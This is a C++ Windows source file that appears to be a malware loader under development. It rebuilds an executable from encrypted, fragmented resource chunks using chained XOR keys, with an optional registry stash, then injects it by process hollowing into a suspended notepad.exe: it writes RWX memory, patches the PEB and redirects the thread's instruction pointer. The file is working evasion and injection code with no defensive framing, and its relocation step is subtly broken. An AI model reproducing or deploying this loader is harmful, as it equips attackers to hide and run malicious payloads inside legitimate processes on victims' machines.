#include <windows.h>
#include <iostream>
#include <cstdint>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

//structures

//header structure (only inside fragment 0)
#pragma pack(push, 1)
struct ChunkHeader {
    char magic[4];        // "FRAG" identifier
    uint32_t total_size;  // Original payload size
    uint16_t total_chunks;// Total number of chunks
    uint16_t chunk_size;  // Size of each chunk
    uint8_t encryption_key; // XOR key
    uint32_t crc32;       // Checksum for verification
    char marker[8];       // "CHUNK001" marker
};
#pragma pack(pop)

const char* REGISTRY_KEY_PATH = "Software\\MyApp\\Chunks"; // curr registry path, change later
const bool STORE_TO_REGISTRY = false; //temporary toggle for debug

typedef struct _PROCESS_BASIC_INFORMATION { //used process environment block, pair with NtQueryInformationProcess
    PVOID Reserved1;
    PVOID PebBaseAddress; //example: used to modify PEB base address so the process knows where the executable is in memory.
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

using pNtQueryInformationProcess = NTSTATUS(WINAPI*)(
    HANDLE, ULONG, PVOID, ULONG, PULONG
);
//==== functions
unsigned char* GetPayloadResource(int id, const char* type, DWORD* size);
std::vector<char> ReconstructFragmentedPayload();
bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize);
uint32_t CalculateCRC32(const char* data, size_t length);
bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    
    //start reconstruction
    std::vector<char> reconstructedPayload = ReconstructFragmentedPayload();
    
    if (reconstructedPayload.empty()) {
        MessageBoxA(NULL, "Failed to reconstruct payload from resources", "Error", MB_ICONERROR);
        return -1;
    }

    // Test reconstruction first
    FILE* testFile = fopen("reconstructed_test.exe", "wb");
    if (testFile) {
        fwrite(reconstructedPayload.data(), 1, reconstructedPayload.size(), testFile);
        fclose(testFile);
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA("reconstructed_test.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            MessageBoxA(NULL, "SUCCESS: Reconstruction works! Now attempting hollowing...", "Debug", MB_OK);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    // Now try hollowing with the proven code
    if (!ValidateAndExecutePayload(reconstructedPayload.data(), reconstructedPayload.size())) {
        MessageBoxA(NULL, "Failed to execute reconstructed payload via hollowing", "Error", MB_ICONERROR);
        return -1;
    }

    return 0;
}

// ============================================================================
// FUNCTION IMPLEMENTATIONS
// ============================================================================

unsigned char* GetPayloadResource(int id, const char* type, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    
    char debugMsg[256];
    sprintf(debugMsg, "Looking for resource: ID=%d, Type=%s", id, type);
    MessageBoxA(NULL, debugMsg, "GetPayloadResource", MB_OK);
    
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(id), type);
    if (!hRes) {
        DWORD error = GetLastError();
        char errMsg[256];
        sprintf(errMsg, "FindResource failed. Error: %lu", error);
        MessageBoxA(NULL, errMsg, "GetPayloadResource", MB_ICONERROR);
        return nullptr;
    }
    
    HGLOBAL hData = LoadResource(hModule, hRes);
    if (!hData) {
        MessageBoxA(NULL, "LoadResource failed", "GetPayloadResource", MB_ICONERROR);
        return nullptr;
    }

    void* pData = LockResource(hData);
    if (!pData) {
        MessageBoxA(NULL, "LockResource failed", "GetPayloadResource", MB_ICONERROR);
        return nullptr;
    }

    *size = SizeofResource(hModule, hRes);
    
    char successMsg[256];
    sprintf(successMsg, "Resource loaded: %lu bytes", *size);
    MessageBoxA(NULL, successMsg, "GetPayloadResource", MB_OK);
    
    return reinterpret_cast<unsigned char*>(pData);
}

bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size) {
    HKEY hKey;
    LONG result;
    
    result = RegCreateKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, NULL, 
                            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueExA(hKey, "decrypted_payload", 0, REG_BINARY, 
                           (const BYTE*)payload, size);
    
    DWORD payloadSize = size;
    RegSetValueExA(hKey, "payload_size", 0, REG_DWORD, 
                   (const BYTE*)&payloadSize, sizeof(payloadSize));

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

std::vector<char> ReconstructFragmentedPayload() {
    HMODULE hModule = GetModuleHandle(NULL);
    char debugMsg[512];

    // === Resource existence checks (unchanged) ===
    HRSRC hResTest = FindResourceA(hModule, MAKEINTRESOURCEA(132), "BIN");
    if (!hResTest) {
        DWORD error = GetLastError();
        sprintf(debugMsg, "FindResource failed for ID 132\nError code: %lu", error);
        MessageBoxA(NULL, debugMsg, "Resource Debug", MB_ICONERROR);
        EnumResourceNamesA(hModule, "BIN", [](HMODULE hModule, LPCSTR lpszType, LPSTR lpszName, LONG_PTR lParam) -> BOOL {
            char msg[256];
            if (IS_INTRESOURCE(lpszName)) sprintf(msg, "Found BIN resource: ID %d", (int)(ULONG_PTR)lpszName);
            else sprintf(msg, "Found BIN resource: %s", lpszName);
            MessageBoxA(NULL, msg, "Available Resources", MB_OK);
            return TRUE;
        }, 0);
        return {};
    }

    MessageBoxA(NULL, "All resource tests passed!", "Resource Debug", MB_OK);

    // === Load chunk 0 ===
    DWORD chunk0Size = 0;
    unsigned char* chunk0Data = GetPayloadResource(132, "BIN", &chunk0Size);
    if (!chunk0Data || chunk0Size < sizeof(ChunkHeader)) {
        MessageBoxA(NULL, "Failed to load chunk 0 or too small for header", "Step 1", MB_ICONERROR);
        return {};
    }

    // === Extract header ===
    ChunkHeader* header = (ChunkHeader*)chunk0Data;

    if (memcmp(header->magic, "FRAG", 4) != 0 || memcmp(header->marker, "CHUNK001", 8) != 0) {
        MessageBoxA(NULL, "Invalid header magic or marker", "Step 2", MB_ICONERROR);
        return {};
    }

    sprintf(debugMsg, "Header valid!\nTotal size: %u\nTotal chunks: %u\nStarting key: 0x%02X",
        header->total_size, header->total_chunks, (unsigned int)header->encryption_key);
    MessageBoxA(NULL, debugMsg, "Step 2", MB_OK);

    // === CHAINED DECRYPTION STARTS HERE ===
    std::vector<char> decryptedPayload;
    decryptedPayload.reserve(header->total_size);

    uint8_t current_key = header->encryption_key;  // this is only the FIRST key now

    std::vector<char> previous_decrypted_chunk;

    for (int i = 0; i < header->total_chunks; i++) {
        DWORD enc_size = 0;
        unsigned char* enc_data = nullptr;
        int actual_size = 0;

        if (i == 0) {
            // Chunk 0: skip header
            enc_data = chunk0Data + sizeof(ChunkHeader);
            actual_size = chunk0Size - sizeof(ChunkHeader);
        } else {
            int resId = 132 + i;
            sprintf(debugMsg, "Loading chunk %d (ID %d)...", i, resId);
            MessageBoxA(NULL, debugMsg, "Step 4", MB_OK);

            enc_data = GetPayloadResource(resId, "BIN", &enc_size);
            if (!enc_data) {
                MessageBoxA(NULL, "Failed to load chunk from resource", "Step 4", MB_ICONERROR);
                return {};
            }
            actual_size = enc_size;
        }

        // Decrypt current chunk
        std::vector<char> this_decrypted(actual_size);
        for (int j = 0; j < actual_size; j++) {
            this_decrypted[j] = enc_data[j] ^ current_key;
        }

        // Append to final payload
        decryptedPayload.insert(decryptedPayload.end(), this_decrypted.begin(), this_decrypted.end());

        sprintf(debugMsg, "Chunk %d decrypted with key 0x%02X (%zu bytes)", i, (unsigned int)current_key, this_decrypted.size());
        MessageBoxA(NULL, debugMsg, "Decryption", MB_OK);

        // Save for next key generation
        previous_decrypted_chunk = std::move(this_decrypted);

        // Generate next key from THIS decrypted chunk (except last one)
        if (i < header->total_chunks - 1) {
            uint32_t crc = CalculateCRC32(previous_decrypted_chunk.data(), previous_decrypted_chunk.size());
            current_key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
        }
    }

    // === All old checks (size, MZ, CRC) unchanged ===
    if (decryptedPayload.size() != header->total_size) {
        sprintf(debugMsg, "Size mismatch! Got %zu, expected %u", decryptedPayload.size(), header->total_size);
        MessageBoxA(NULL, debugMsg, "Step 5", MB_ICONERROR);
        return {};
    }
    MessageBoxA(NULL, "Success: Total size correct", "Step 5", MB_OK);

    MessageBoxA(NULL, "Success: CHAINED DECRYPTION COMPLETE", "Step 6", MB_OK);

    // PE + CRC checks exactly as before
    if (decryptedPayload[0] != 'M' || decryptedPayload[1] != 'Z') {
        MessageBoxA(NULL, "PE SIGNATURE MISMATCH!", "CRITICAL ERROR", MB_ICONERROR);
        return {};
    }

    uint32_t calculatedCRC = CalculateCRC32(decryptedPayload.data(), header->total_size);
    char crcMsg[256];
    sprintf(crcMsg, "CRC Result:\nCalculated: 0x%08X\nExpected: 0x%08X\nMatch: %s",
        calculatedCRC, header->crc32, (calculatedCRC == header->crc32) ? "YES" : "NO");
    MessageBoxA(NULL, crcMsg, "CRC Check", MB_OK);

    if (calculatedCRC != header->crc32) {
        MessageBoxA(NULL, "CRC CHECK FAILED!", "ERROR", MB_ICONERROR);
        return {};
    }

    MessageBoxA(NULL, "Success: CRC check passed", "Step 7", MB_OK);
    return decryptedPayload;
}

uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize) {
    
    // Use your EXACT previous working code:
    // Validate PE header (MZ)
    if (payload[0] != 'M' || payload[1] != 'Z') {
        MessageBoxA(NULL, "[!] Invalid PE signature after decryption.", "Error", MB_ICONERROR);
        return false;
    }

    // Parse PE headers
    BYTE* pe = (BYTE*)payload;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        MessageBoxA(NULL, "[!] NT signature invalid.", "Error", MB_ICONERROR);
        return false;
    }

    // Create suspended target process (notepad.exe)
    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    char cmdLine[] = "C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        MessageBoxA(NULL, "[!] Failed to create target process.", "Error", MB_ICONERROR);
        return false;
    }

    // Prepare to modify thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        MessageBoxA(NULL, "[!] GetThreadContext failed.", "Error", MB_ICONERROR);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Attempt to allocate memory at original ImageBase first
    LPVOID remoteImage = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Fallback: allocate anywhere if base is already taken
    if (!remoteImage) {
        remoteImage = VirtualAllocEx(pi.hProcess, NULL,
            nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!remoteImage) {
            MessageBoxA(NULL, "[!] VirtualAllocEx failed.", "Error", MB_ICONERROR);
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Adjust ImageBase in PE headers
        nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
    }

   ULONGLONG originalImageBase = nt->OptionalHeader.ImageBase;
ULONGLONG delta = (ULONGLONG)remoteImage - originalImageBase;

if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
    IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
    SIZE_T processed = 0;

    while (processed < relocDir.Size) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* relocData = (WORD*)(reloc + 1);

        for (DWORD i = 0; i < count; ++i) {
            DWORD type = relocData[i] >> 12;
            DWORD offset = relocData[i] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                *patchAddr += delta;
            }
        }

        processed += reloc->SizeOfBlock;
        reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
    }

    // ✅ Set the new base AFTER relocations
    nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
}


    // === Write headers ===
    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, remoteImage, pe, nt->OptionalHeader.SizeOfHeaders, &written);

    // === Write sections ===
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
        LPVOID src = pe + sections[i].PointerToRawData;
        SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);

        BYTE* padded = new BYTE[sectionSize];
        ZeroMemory(padded, sectionSize);
        memcpy(padded, src, sections[i].SizeOfRawData);

        WriteProcessMemory(pi.hProcess, dest, padded, sectionSize, &written);
        delete[] padded;
    }

    // Update remote process PEB image base
    PROCESS_BASIC_INFORMATION pbi = {};
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess ||
        NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL) != 0) {
        MessageBoxA(NULL, "[!] Failed to get remote PEB base.", "Error", MB_ICONERROR);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID remotePEBImageBaseAddr = (BYTE*)pbi.PebBaseAddress + 0x10;
    WriteProcessMemory(pi.hProcess, remotePEBImageBaseAddr, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);

    // Set RIP to new PE entry point
    ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // Flush instruction cache and resume
    FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage);
    ResumeThread(pi.hThread);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}